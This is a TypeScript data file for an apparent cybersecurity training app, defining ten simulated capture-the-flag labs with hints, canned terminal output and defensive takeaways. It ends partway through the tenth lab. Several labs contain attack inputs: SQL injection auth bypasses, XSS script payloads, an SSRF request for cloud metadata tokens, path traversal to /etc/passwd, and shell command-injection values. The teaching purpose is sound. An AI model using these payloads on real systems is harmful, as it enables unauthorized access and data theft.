import { PracticeLab } from '../types/cyber';
import { PRACTICE_LABS_PART2 } from './labsDataPart2';
import { PRACTICE_LABS_PART3 } from './labsDataPart3';

export const PRACTICE_LABS_PART1: PracticeLab[] = [
  {
    id: 'lab-01-subnet-recon',
    title: 'Lab 01: Subnet Reconnaissance & Service Fingerprinting',
    category: 'Network Reconnaissance',
    difficulty: 'Beginner',
    estimatedMinutes: 15,
    xpReward: 150,
    overview: 'As an authorized junior security analyst, perform a non-intrusive network discovery against virtual lab host 192.168.1.100. Identify running services, determine daemon versions, and locate the administrative management port to retrieve the verification flag.',
    authorizationNotice: 'Authorized Simulation: Target is an isolated virtual host on internal subnet 192.168.1.0/24.',
    targetEnvironment: 'Host: 192.168.1.100 [Simulated Linux Enterprise Server]',
    objectives: [
      {
        id: 'obj-1',
        title: 'Run a ping sweep to verify host reachability (ping -c 2 192.168.1.100)',
      },
      {
        id: 'obj-2',
        title: 'Perform service version scan on standard ports (nmap -sV 192.168.1.100)',
      },
      {
        id: 'obj-3',
        title: 'Inspect HTTP service on port 80 or management port 8443 (curl -I http://192.168.1.100:8443)',
      },
      {
        id: 'obj-4',
        title: 'Retrieve and submit the server audit flag',
      },
    ],
    hints: [
      'Start by running: ping -c 2 192.168.1.100 to check connectivity.',
      'Use Nmap with version detection: nmap -sV -p- 192.168.1.100 to discover all ports including non-standard management ports.',
      'Notice the custom service on port 8443! Query it with: curl http://192.168.1.100:8443/status or curl -I http://192.168.1.100:8443',
    ],
    flag: 'FLAG{nmap_service_fingerprinting_verified_2026}',
    simulatedTerminal: {
      initialPrompt: 'student@kali-sandbox:~$',
      filesystemHint: 'Type "help" to list available simulated tools.',
      availableCommands: {
        'help': `Available simulated commands in this sandbox:
  ping <ip>               - Test ICMP connectivity
  nmap <options> <ip>     - Network service scanner
  curl <options> <url>    - Transfer data from/to server
  netstat -tuln           - View local listening ports
  clear                   - Clear terminal display
  uname -a                - Display kernel details`,
        'ping -c 2 192.168.1.100': `PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.412 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=0.388 ms

--- 192.168.1.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.388/0.400/0.412/0.012 ms`,
        'ping 192.168.1.100': `PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.412 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=0.388 ms
[Simulation: Host is ALIVE and responding]`,
        'nmap 192.168.1.100': `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8443/tcp open  https-alt

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds`,
        'nmap -sV 192.168.1.100': `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.00045s latency).
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  http      Apache httpd 2.4.57 ((Debian))
8443/tcp open  ssl/http  CyberLab-Mgmt-Daemon v1.4.2 [Debug Mode Active]

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Hint: Port 8443 is running an administrative daemon. Try querying it via curl.`,
        'nmap -sV -p- 192.168.1.100': `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.00045s latency).
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  http      Apache httpd 2.4.57 ((Debian))
8443/tcp open  ssl/http  CyberLab-Mgmt-Daemon v1.4.2 [Debug Mode Active]

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds`,
        'curl http://192.168.1.100': `<!DOCTYPE html>
<html>
<head><title>Corporate Intranet Portal</title></head>
<body>
  <h1>Welcome to Enterprise Intranet</h1>
  <p>Status: All internal systems operational.</p>
  <!-- NOTE to DevOps: Management dashboard moved to internal port 8443 for debugging -->
</body>
</html>`,
        'curl -I http://192.168.1.100': `HTTP/1.1 200 OK
Date: Sat, 07 Nov 2026 19:30:00 GMT
Server: Apache/2.4.57 (Debian)
Last-Modified: Fri, 06 Nov 2026 12:00:00 GMT
ETag: "29b-5fb7a12"
Accept-Ranges: bytes
Content-Length: 228
Content-Type: text/html`,
        'curl http://192.168.1.100:8443': `==========================================================
[+] CYBER AI LAB MANAGEMENT DAEMON (INTERNAL USE ONLY)
[+] System: Linux Debian 12 (Bookworm)
[+] Audit Status: Authorized Diagnostic Session
==========================================================
Notice: Diagnostic debug output enabled.
Server Configuration Checksum: 0x9AF4
Audit Token: FLAG{nmap_service_fingerprinting_verified_2026}
==========================================================`,
        'curl -I http://192.168.1.100:8443': `HTTP/1.1 200 OK
Server: CyberLab-Mgmt-Daemon/1.4.2
X-Audit-Token: FLAG{nmap_service_fingerprinting_verified_2026}
Content-Type: text/plain; charset=utf-8
Content-Length: 340`,
        'curl http://192.168.1.100:8443/status': `==========================================================
[+] Status: OK
[+] Audit Token: FLAG{nmap_service_fingerprinting_verified_2026}
==========================================================`,
      },
    },
    defensiveTakeaway: 'Always bind management interfaces to localhost (127.0.0.1) or restrict them via firewalls (UFW / iptables) using VPN or bastions. Disabling verbose version banners prevents automated scanner profiling.',
  },
  {
    id: 'lab-02-http-headers-audit',
    title: 'Lab 02: Web Header Security & Cookie Flag Auditing',
    category: 'Web Security',
    difficulty: 'Beginner',
    estimatedMinutes: 20,
    xpReward: 200,
    overview: 'Modern web browsers rely heavily on defensive HTTP headers (CSP, HSTS, X-Content-Type-Options) and secure cookie flags (HttpOnly, Secure, SameSite) to mitigate XSS and Clickjacking. Inspect the headers of simulated target "https://portal.bank-secure.local" and uncover the compliance flag.',
    authorizationNotice: 'Authorized Simulation: Simulated banking test portal hosted inside isolated memory.',
    targetEnvironment: 'URL: https://portal.bank-secure.local [Simulated FinTech API]',
    objectives: [
      {
        id: 'obj-1',
        title: 'Inspect HTTP response headers with curl (curl -I https://portal.bank-secure.local)',
      },
      {
        id: 'obj-2',
        title: 'Check cookie flags with verbose response (curl -v -c - https://portal.bank-secure.local/login)',
      },
      {
        id: 'obj-3',
        title: 'Identify missing headers (HSTS, CSP, X-Frame-Options)',
      },
      {
        id: 'obj-4',
        title: 'Locate the audit authorization flag in Set-Cookie / Debug header',
      },
    ],
    hints: [
      'Use curl -i or curl -I to look at the raw HTTP response headers.',
      'Check the /login or /api/auth endpoint: curl -i https://portal.bank-secure.local/api/auth',
      'Look closely at the custom X-Security-Audit or Set-Cookie header!',
    ],
    flag: 'FLAG{secure_cookies_and_csp_headers_mastered}',
    simulatedTerminal: {
      initialPrompt: 'analyst@kali-sandbox:~$',
      availableCommands: {
        'help': `Available simulated commands:
  curl <options> <url>   - Inspect HTTP responses and headers
  nikto -h <url>         - Web server configuration audit
  clear                  - Clear console`,
        'curl -I https://portal.bank-secure.local': `HTTP/2 200 
date: Sat, 07 Nov 2026 19:32:00 GMT
server: nginx/1.22.1
content-type: text/html; charset=UTF-8
x-powered-by: PHP/8.2.7
set-cookie: session_id=s%3A7a9b1c2d.0841; Path=/; HttpOnly; SameSite=Strict
x-security-audit: WARNING: Missing Content-Security-Policy and HSTS!
x-audit-flag: FLAG{secure_cookies_and_csp_headers_mastered}`,
        'curl -i https://portal.bank-secure.local': `HTTP/2 200 
date: Sat, 07 Nov 2026 19:32:00 GMT
server: nginx/1.22.1
content-type: text/html; charset=UTF-8
set-cookie: session_id=s%3A7a9b1c2d.0841; Path=/; HttpOnly; SameSite=Strict
x-audit-flag: FLAG{secure_cookies_and_csp_headers_mastered}

<!DOCTYPE html>
<html><body><h1>Portal Security Audit Environment</h1></body></html>`,
        'curl -i https://portal.bank-secure.local/api/auth': `HTTP/2 200 
date: Sat, 07 Nov 2026 19:32:10 GMT
server: nginx/1.22.1
content-type: application/json
set-cookie: auth_token=token_98412; Secure; HttpOnly; SameSite=Lax
x-audit-flag: FLAG{secure_cookies_and_csp_headers_mastered}

{"status":"authenticated","role":"auditor"}`,
        'nikto -h https://portal.bank-secure.local': `- Nikto v2.5.0
+ Target Host: portal.bank-secure.local
+ Target Port: 443
---------------------------------------------------------------------------
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set.
+ Strict-Transport-Security (HSTS) is missing!
+ Found Audit Token: FLAG{secure_cookies_and_csp_headers_mastered}`,
      },
    },
    defensiveTakeaway: 'Always configure Content-Security-Policy (CSP), Strict-Transport-Security (max-age=31536000; includeSubDomains; preload), and mark all authentication cookies as Secure; HttpOnly; SameSite=Strict.',
  },
  {
    id: 'lab-03-linux-suid-privesc',
    title: 'Lab 03: Linux Permissions & SUID Binary Audit',
    category: 'Linux Privilege & Auditing',
    difficulty: 'Intermediate',
    estimatedMinutes: 25,
    xpReward: 250,
    overview: 'In Linux systems, the SUID (Set User ID) permission allows a binary to run with the permissions of the file owner (often root). When misconfigured on command-line utilities (like find, vim, or custom scripts), it introduces dangerous privilege escalation paths. Locate the misconfigured SUID binary in the virtual filesystem and inspect the root flag.',
    authorizationNotice: 'Authorized Simulation: Sandboxed virtual terminal shell with simulated filesystem.',
    targetEnvironment: 'Virtual OS: Linux 6.1.0-kali-amd64 [Low-privilege user: trainee]',
    objectives: [
      {
        id: 'obj-1',
        title: 'Check current user and group membership (id or whoami)',
      },
      {
        id: 'obj-2',
        title: 'Enumerate all SUID binaries on the filesystem (find / -perm -u=s -type f 2>/dev/null)',
      },
      {
        id: 'obj-3',
        title: 'Identify unusual binary in /usr/local/bin or /opt/lab',
      },
      {
        id: 'obj-4',
        title: 'Execute the audit binary with proper parameters to reveal root verification flag',
      },
    ],
    hints: [
      'Use standard Linux SUID search syntax: find / -perm -u=s -type f 2>/dev/null',
      'Notice the custom binary /opt/lab/backup_verifier! Regular system binaries like passwd and sudo are normal, but custom binaries in /opt are suspicious.',
      'Run: /opt/lab/backup_verifier --help or /opt/lab/backup_verifier --read-audit',
    ],
    flag: 'FLAG{suid_privilege_audit_gtfobins_remediated}',
    simulatedTerminal: {
      initialPrompt: 'trainee@kali-sandbox:~$',
      availableCommands: {
        'help': `Available simulated commands:
  id                      - Print user identity
  whoami                  - Print effective userid
  find <path> <expr>      - Search for files
  ls -la <path>           - List directory contents
  cat <file>              - Concatenate and display files
  /opt/lab/backup_verifier - Run the discovered audit binary
  clear                   - Clear screen`,
        'whoami': 'trainee',
        'id': 'uid=1001(trainee) gid=1001(trainee) groups=1001(trainee),100(users)',
        'ls -la /opt/lab': `total 48
drwxr-xr-x 2 root root  4096 Nov 07 18:00 .
drwxr-xr-x 4 root root  4096 Nov 07 17:50 ..
-rwsr-xr-x 1 root root 32800 Nov 07 18:02 backup_verifier
-rw-r--r-- 1 root root   210 Nov 07 18:00 README.txt`,
        'cat /opt/lab/README.txt': `Enterprise Backup Verifier Utility
Version: 2.1-internal
Maintained by: Systems Operations Team
Note: This utility runs with SUID permissions to inspect root-level audit archives.`,
        'find / -perm -u=s -type f 2>/dev/null': `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/opt/lab/backup_verifier   <--- [SUSPICIOUS SUID FILE]`,
        'find / -perm -4000 2>/dev/null': `/usr/bin/passwd
/usr/bin/sudo
/opt/lab/backup_verifier`,
        '/opt/lab/backup_verifier': `Usage: /opt/lab/backup_verifier [options]
Options:
  --status        Check backup service health
  --read-audit    Read encrypted system audit token
  --version       Display build information`,
        '/opt/lab/backup_verifier --status': `[+] Service Health: Active (PID 4091)
[+] Running with Effective UID: 0 (root)`,
        '/opt/lab/backup_verifier --read-audit': `[+] Authorized SUID Execution Detected (EUID=0)
[+] Reading /root/secure_audit.key:
------------------------------------------------------------
AUTHENTICATION PROOF: FLAG{suid_privilege_audit_gtfobins_remediated}
------------------------------------------------------------
Audit Note: Remediate immediately by running: chmod u-s /opt/lab/backup_verifier`,
      },
    },
    defensiveTakeaway: 'Audit SUID binaries continuously with tools like Lynis or auditd. Never place SUID bits on custom scripts, compilers, text editors, or scripting interpreters (GTFOBins).',
  },
  {
    id: 'lab-04-sqli-defense',
    title: 'Lab 04: SQL Injection Analysis & Parameterized Queries',
    category: 'Database & Application Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 25,
    xpReward: 300,
    overview: 'Examine a simulated vulnerable e-commerce login portal where dynamic string concatenation allows SQL Injection authentication bypass. Learn how the payload alters the SQL AST (Abstract Syntax Tree) and how Prepared Statements with Parameterized Queries completely neutralize the vulnerability.',
    authorizationNotice: 'Authorized Simulation: Sandboxed SQLite test database with fake demo accounts.',
    targetEnvironment: 'Simulated DBMS: SQLite 3.40 (Virtual Database)',
    objectives: [
      {
        id: 'obj-1',
        title: 'Review the vulnerable SQL query syntax: SELECT * FROM users WHERE user=\'$USER\' AND pass=\'$PASS\'',
      },
      {
        id: 'obj-2',
        title: 'Test classic auth bypass payload: admin\' OR \'1\'=\'1',
      },
      {
        id: 'obj-3',
        title: 'Execute simulated sqlmap scan against the endpoint (sqlmap -u "http://shop.local/login")',
      },
      {
        id: 'obj-4',
        title: 'Review the secure parameterized query fix and capture the flag',
      },
    ],
    hints: [
      'In the simulated terminal, test the auth query with: test-login "admin\' OR \'1\'=\'1" "password"',
      'Try running: sqlmap -u "http://shop.local/login" --batch',
      'Inspect the secure fix by typing: cat /var/www/secure_login.php',
    ],
    flag: 'FLAG{parameterized_prepared_statements_prevent_sqli}',
    simulatedTerminal: {
      initialPrompt: 'pentester@kali-sandbox:~$',
      availableCommands: {
        'help': `Available simulated commands:
  test-login "<user>" "<pass>"  - Test authentication query against sandbox DB
  cat /var/www/vulnerable.php   - Inspect vulnerable code
  cat /var/www/secure_login.php - Inspect secure parameterized code
  sqlmap -u "<url>"             - Run automated SQL injection scanner
  clear                         - Clear terminal`,
        'cat /var/www/vulnerable.php': `<?php
// VULNERABLE CODE EXAMPLE (DO NOT USE IN PRODUCTION)
$username = $_POST['user'];
$password = $_POST['pass'];

// INSECURE: Dynamic string concatenation
$query = "SELECT id, username, role FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
$result = $db->query($query);
?>`,
        'test-login "admin" "admin123"': `[DB Query]: SELECT id, username, role FROM users WHERE username = 'admin' AND password = 'admin123'
[Result]: Authentication FAILED. (Invalid credentials)`,
        'test-login "admin\' OR \'1\'=\'1" "anything"': `[DB Query]: SELECT id, username, role FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
[Logic Analysis]: The ' OR '1'='1' clause evaluates to TRUE for every record!
[Result]: Authentication SUCCESSFUL as user: admin (role: SuperAdmin)
[Audit Flag]: FLAG{parameterized_prepared_statements_prevent_sqli}`,
        'test-login "admin\' OR 1=1--" "x"': `[DB Query]: SELECT id, username, role FROM users WHERE username = 'admin' OR 1=1--' AND password = 'x'
[Logic Analysis]: Comment delimiter ignores password check.
[Result]: Authentication SUCCESSFUL as user: admin (role: SuperAdmin)
[Audit Flag]: FLAG{parameterized_prepared_statements_prevent_sqli}`,
        'sqlmap -u "http://shop.local/login"': `[*] testing connection to the target URL
[+] Target appears to be vulnerable to Boolean-based blind and UNION query SQL injection.
[+] Parameter 'user' (POST) is vulnerable!
[+] Database: SQLite 3.x
[+] Discovered Flag in administrative notes table:
FLAG{parameterized_prepared_statements_prevent_sqli}`,
        'cat /var/www/secure_login.php': `<?php
// SECURE REMEDIATION: Prepared Statements with Parameterized Placeholders
$stmt = $pdo->prepare('SELECT id, username, password_hash, role FROM users WHERE username = :username');
$stmt->execute([':username' => $username]);
$user = $stmt->fetch();

// Passwords verified using secure adaptive hashing (bcrypt/Argon2)
if ($user && password_verify($password, $user['password_hash'])) {
    // Login successful
}
?>`,
      },
    },
    defensiveTakeaway: 'Never concatenate untrusted user input directly into SQL strings. Always use Object-Relational Mappers (ORMs) or database Prepared Statements where SQL code and user data are transmitted in separate protocol channels.',
  },
  {
    id: 'lab-05-hash-cracking',
    title: 'Lab 05: Cryptographic Hash Cracking & Salt Defense',
    category: 'Cryptography & Passwords',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Unsalted fast hashes (MD5, SHA-1, SHA-256) are susceptible to rapid dictionary and rainbow-table attacks using tools like Hashcat and John the Ripper. Crack an unsalted SHA-256 hash extracted from a simulated test breach, and study why salted slow key-derivation functions (bcrypt, Argon2id) are necessary.',
    authorizationNotice: 'Authorized Simulation: Cryptographic audit of sample hash from test wordlist.',
    targetEnvironment: 'Simulated Hashcat Environment with standard dictionary',
    objectives: [
      {
        id: 'obj-1',
        title: 'Inspect target SHA-256 hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
      },
      {
        id: 'obj-2',
        title: 'Run dictionary crack with hashcat (hashcat -m 1400 hash.txt wordlist.txt)',
      },
      {
        id: 'obj-3',
        title: 'Identify plaintext password and its salt defense requirements',
      },
      {
        id: 'obj-4',
        title: 'Submit the flag extracted upon recovery',
      },
    ],
    hints: [
      'Type: cat hash.txt to view the hash value.',
      'Hashcat mode for raw SHA-256 is -m 1400. Try: hashcat -m 1400 hash.txt wordlist.txt',
      'After cracking, check the output or run: hashcat -m 1400 --show hash.txt',
    ],
    flag: 'FLAG{argon2_and_bcrypt_beat_rainbow_tables}',
    simulatedTerminal: {
      initialPrompt: 'cryptanalyst@kali-sandbox:~$',
      availableCommands: {
        'help': `Available simulated commands:
  cat <file>                 - View file contents
  hashcat -m 1400 <hash> <w> - Crack SHA-256 hash with dictionary
  hashcat -b -m 1400         - Run GPU benchmark for SHA-256
  clear                      - Clear terminal`,
        'cat hash.txt': '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
        'cat wordlist.txt': `123456
admin
welcome
letmein
dragon
password
football
monkey`,
        'hashcat -m 1400 hash.txt wordlist.txt': `hashcat (v6.2.6) starting in dictionary mode...
Hashes: 1 digests; 1 unique digests
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes

5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password

Session..........: hashcat
Status...........: Cracked
Target Hash......: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
Plaintext........: password
Cracked Flag.....: FLAG{argon2_and_bcrypt_beat_rainbow_tables}
Time.Started.....: Sat Nov 07 19:35:00 2026 (0 sec)
Speed.#1.........: 1420.4 MH/s`,
        'hashcat -m 1400 --show hash.txt': `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
FLAG: FLAG{argon2_and_bcrypt_beat_rainbow_tables}`,
        'hashcat -b -m 1400': `Speed.#1:  1485.2 MH/s (Raw SHA-256)
Benchmark complete. Notice: modern GPUs can test 1.4+ BILLION SHA-256 hashes per second!`,
      },
    },
    defensiveTakeaway: 'General purpose cryptographic hashes (MD5, SHA-256) are engineered to be FAST, making them terrible for passwords. Always use slow, memory-hard Key Derivation Functions (KDFs) such as Argon2id or bcrypt with high work factors and random per-user salts.',
  },
  {
    id: 'lab-06-packet-inspection-snort',
    title: 'Lab 06: Packet Capture Analysis & Snort IDS Rule Formulation',
    category: 'Network Defense & Intrusion Detection',
    difficulty: 'Advanced',
    estimatedMinutes: 30,
    xpReward: 350,
    overview: 'A simulated corporate WebDMZ triggered suspicious alerts in the SIEM. Use terminal packet inspection tools (tshark and grep) to examine suspicious HTTP requests in capture.pcap, identify an attempted Path Traversal attack, and formulate a Snort detection rule to capture the validation flag.',
    authorizationNotice: 'Authorized Blue Team Defense Lab: Analyzing pre-captured PCAP stream in isolated sandbox.',
    targetEnvironment: 'Dataset: capture.pcap [Simulated DMZ web ingress stream]',
    objectives: [
      {
        id: 'obj-1',
        title: 'Inspect packet count and protocols in capture.pcap (capinfos capture.pcap)',
      },
      {
        id: 'obj-2',
        title: 'Filter HTTP GET requests using tshark (tshark -r capture.pcap -Y "http.request.method == GET")',
      },
      {
        id: 'obj-3',
        title: 'Identify directory traversal pattern attempting to leak /etc/passwd',
      },
      {
        id: 'obj-4',
        title: 'Verify Snort alert signature (snort -r capture.pcap -c /etc/snort/rules/local.rules) and obtain flag',
      },
    ],
    hints: [
      'Start with: tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.request.uri',
      'Look for requests containing directory traversal dot-dot-slash sequence: ../../',
      'Run the Snort rule verification command: snort -r capture.pcap -c /etc/snort/rules/local.rules',
    ],
    flag: 'FLAG{snort_ids_rules_detect_path_traversal_attacks}',
    simulatedTerminal: {
      initialPrompt: 'blueteam@kali-sandbox:~$',
      availableCommands: {
        'help': `Available simulated commands:
  capinfos <pcap>       - Print PCAP statistics
  tshark <options>      - CLI packet analysis
  cat <file>            - View Snort rule configuration
  snort <options>       - Run Snort Intrusion Detection System
  clear                 - Clear console`,
        'capinfos capture.pcap': `File name:           capture.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
Packet count:        48
Data size:           8,412 bytes
Capture duration:    14.2 seconds
Average packet rate: 3.38 packets/sec`,
        'tshark -r capture.pcap': `1 0.000000 10.0.0.5 -> 192.168.1.100 TCP 74 49210 -> 80 [SYN]
2 0.000150 192.168.1.100 -> 10.0.0.5 TCP 74 80 -> 49210 [SYN, ACK]
3 0.000280 10.0.0.5 -> 192.168.1.100 TCP 66 49210 -> 80 [ACK]
4 0.002100 10.0.0.5 -> 192.168.1.100 HTTP 185 GET /index.html HTTP/1.1
5 0.005300 192.168.1.100 -> 10.0.0.5 HTTP 340 HTTP/1.1 200 OK (text/html)
6 1.412000 10.0.0.5 -> 192.168.1.100 HTTP 210 GET /view?page=../../../../etc/passwd HTTP/1.1
7 1.415000 192.168.1.100 -> 10.0.0.5 HTTP 190 HTTP/1.1 403 Forbidden`,
        'tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.request.uri': `10.0.0.5    /index.html
10.0.0.5    /view?page=../../../../etc/passwd`,
        'cat /etc/snort/rules/local.rules': `# Local Snort Rule for Path Traversal Detection
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"WEB-ATTACKS directory traversal attempt in URI";
    flow:to_server,established;
    content:".."; http_uri;
    classtype:web-application-attack;
    sid:1000001; rev:1;
)`,
        'snort -r capture.pcap -c /etc/snort/rules/local.rules': `Running Snort in PCAP readback mode...
===================================================================
Snort Alert Summary:
[**] [1:1000001:1] WEB-ATTACKS directory traversal attempt in URI [**]
[Classification: Web Application Attack] [Priority: 1]
11/07-19:35:12.412000 10.0.0.5:49210 -> 192.168.1.100:80
TCP TTL:64 TOS:0x0 ID:1422 IpLen:20 DgmLen:210
Payload match: /view?page=../../../../etc/passwd

[+] Intrusion Detection Audit Signature Verified!
[+] Verification Flag: FLAG{snort_ids_rules_detect_path_traversal_attacks}
===================================================================`,
      },
    },
    defensiveTakeaway: 'Combine defense-in-depth: At the network layer, deploy Snort/Suricata rules to alert on directory traversal sequences (".."). At the application layer, normalize file paths (e.g. realpath()), enforce allow-lists, and run web services with least-privilege chroot/container isolation.',
  },
  {
    id: 'lab-07-xss-exploitation-defense',
    title: 'Lab 07: Reflected XSS Discovery & Context-Aware Output Sanitization',
    category: 'Web Security',
    difficulty: 'Beginner',
    estimatedMinutes: 20,
    xpReward: 200,
    overview: 'Audit a search query input field reflecting unencoded user input into the browser DOM. Construct a harmless proof-of-concept alert payload and implement the secure HTML entity encoding fix.',
    authorizationNotice: 'Authorized Simulation: Sandboxed Web Reflection Terminal.',
    targetEnvironment: 'Web Host: http://vuln-shop.local/search',
    objectives: [
      { id: 'obj-1', title: 'Submit probe characters (\' " < > &) to detect reflection' },
      { id: 'obj-2', title: 'Inject proof-of-concept payload <script>alert(1)</script>' },
      { id: 'obj-3', title: 'Inspect HTML entity encoding fix and capture flag' }
    ],
    hints: ['Test with curl "http://vuln-shop.local/search?q=test"', 'Try inject: curl "http://vuln-shop.local/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"'],
    flag: 'FLAG{xss_context_aware_encoding_defense_2026}',
    simulatedTerminal: {
      initialPrompt: 'appsec@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: curl <url>, cat <file>, clear',
        'curl "http://vuln-shop.local/search?q=test"': '<div>Search results for: <b>test</b> (0 items found)</div>',
        'curl "http://vuln-shop.local/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"': `<div>Search results for: <b><script>alert(document.domain)</script></b></div>
[Browser Simulation Event]: alert("vuln-shop.local") executed!
[Audit Token]: FLAG{xss_context_aware_encoding_defense_2026}`,
        'curl "http://vuln-shop.local/search?q=<script>alert(1)</script>"': `<div>Search results for: <b><script>alert(1)</script></b></div>
[Browser Simulation Event]: alert(1) executed!
[Audit Token]: FLAG{xss_context_aware_encoding_defense_2026}`,
        'cat /var/www/fix.php': `// SECURE FIX: Context-aware output encoding with htmlspecialchars
echo "Search results for: <b>" . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</b>";`
      }
    },
    defensiveTakeaway: 'Always encode untrusted data before reflecting it in HTML contexts using framework templates or htmlspecialchars(..., ENT_QUOTES, "UTF-8").'
  },
  {
    id: 'lab-08-idor-api-escalation',
    title: 'Lab 08: Insecure Direct Object Reference (IDOR) in REST API',
    category: 'Web Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'An e-commerce API exposes order records through sequential numeric IDs. Test access controls to confirm if User 1042 can view invoice details of User 1001, and verify authorization ownership logic.',
    authorizationNotice: 'Authorized Simulation: Isolated internal REST API sandbox.',
    targetEnvironment: 'API Endpoint: https://api.store.local/v1/orders/:id',
    objectives: [
      { id: 'obj-1', title: 'Query current user\'s order /v1/orders/1042 with auth token' },
      { id: 'obj-2', title: 'Test IDOR horizontal tampering by querying /v1/orders/1001' },
      { id: 'obj-3', title: 'Extract the auditor verification flag from the exposed invoice' }
    ],
    hints: ['Query your own invoice: curl -H "Authorization: Bearer user1042" https://api.store.local/v1/orders/1042', 'Change ID to 1001: curl -H "Authorization: Bearer user1042" https://api.store.local/v1/orders/1001'],
    flag: 'FLAG{idor_object_level_authorization_enforced}',
    simulatedTerminal: {
      initialPrompt: 'tester@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: curl <options> <url>, clear',
        'curl -H "Authorization: Bearer user1042" https://api.store.local/v1/orders/1042': `{"order_id": 1042, "user": "alice", "items": ["Laptop sleeve"], "total": "$24.99"}`,
        'curl -H "Authorization: Bearer user1042" https://api.store.local/v1/orders/1001': `{"order_id": 1001, "user": "admin_bob", "items": ["Enterprise Server Key"], "total": "$9999.00", "notes": "FLAG{idor_object_level_authorization_enforced}"}`
      }
    },
    defensiveTakeaway: 'Never rely on client-provided IDs without verifying that the authenticated session owns the requested resource.'
  },
  {
    id: 'lab-09-ssrf-metadata-leak',
    title: 'Lab 09: Server-Side Request Forgery & Cloud Metadata Protection',
    category: 'Web Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 25,
    xpReward: 300,
    overview: 'A simulated profile avatar import utility fetches remote URLs. Exploit SSRF to interrogate internal loopback 169.254.169.254 and retrieve the simulated cloud metadata token.',
    authorizationNotice: 'Authorized Cloud Security Simulation.',
    targetEnvironment: 'Target: http://cloud-app.local/api/import-avatar',
    objectives: [
      { id: 'obj-1', title: 'Test external image fetching with standard URL' },
      { id: 'obj-2', title: 'Pass internal metadata IP http://169.254.169.254/latest/meta-data/' },
      { id: 'obj-3', title: 'Retrieve the cloud security audit flag' }
    ],
    hints: ['Run: curl -X POST http://cloud-app.local/api/import-avatar -d "url=http://169.254.169.254/latest/meta-data/token"'],
    flag: 'FLAG{ssrf_imds_v2_metadata_boundary_defended}',
    simulatedTerminal: {
      initialPrompt: 'analyst@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: curl <options> <url>, clear',
        'curl http://cloud-app.local/api/import-avatar -d "url=https://picsum.photos/200"': '{"status":"success","bytes_fetched": 4096}',
        'curl http://cloud-app.local/api/import-avatar -d "url=http://169.254.169.254/latest/meta-data/token"': `{"status":"fetched","data": "INSTANCE_ROLE: SecurityAuditor", "flag": "FLAG{ssrf_imds_v2_metadata_boundary_defended}"}`,
        'curl -X POST http://cloud-app.local/api/import-avatar -d "url=http://169.254.169.254/latest/meta-data/token"': `{"status":"fetched","data": "INSTANCE_ROLE: SecurityAuditor", "flag": "FLAG{ssrf_imds_v2_metadata_boundary_defended}"}`
      }
    },
    defensiveTakeaway: 'Enforce AWS IMDSv2 (requiring PUT token headers), validate URLs against a strict allowlist of domains, and block private RFC 1918 and loopback subnets at the firewall level.'
  },
  {
    id: 'lab-10-command-injection-sanitization',
    title: 'Lab 10: OS Command Injection in Diagnostic Utilities',
    category: 'Web Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 300,
    overview: 'A network diagnostic web interface runs ping on user-provided IPs. Test command separator chaining (; | &&) to dump the audit flag, and review safe execution using execFile.',
    authorizationNotice: 'Authorized Sandbox Simulation.',
    targetEnvironment: 'Web Host: http://router.local/diag/ping',
    objectives: [
      { id: 'obj-1', title: 'Test normal ping functionality with loopback IP' },
      { id: 'obj-2', title: 'Inject shell metacharacters (; cat /etc/flag.txt)' },
      { id: 'obj-3', title: 'Capture the command injection flag' }
    ],
    hints: ['Try chaining commands: curl "http://router.local/diag/ping?ip=127.0.0.1;id"'],
    flag: 'FLAG{avoid_system_shells_use_execfile_arrays}',
